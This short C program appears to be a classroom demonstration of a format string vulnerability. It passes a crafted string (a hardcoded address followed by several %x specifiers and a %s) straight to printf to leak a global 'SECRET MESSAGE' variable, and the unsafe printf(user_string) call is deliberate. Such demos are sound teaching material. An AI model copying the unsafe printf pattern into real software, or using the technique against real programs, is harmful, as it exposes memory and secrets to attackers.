#include<stdio.h>
#include<string.h>

static char str[100] = "SECRET MESSAGE";

void main() {
	char user_string[100];
	//printf("%08x\n", (unsigned long) str);

	memset(user_string, 0, sizeof(user_string));

	strcpy(user_string, "\x40\xa0\x04\x08 %x %x %x %x %x %x %s"); // first four bytes consitute the address of str.

	printf(user_string);
}
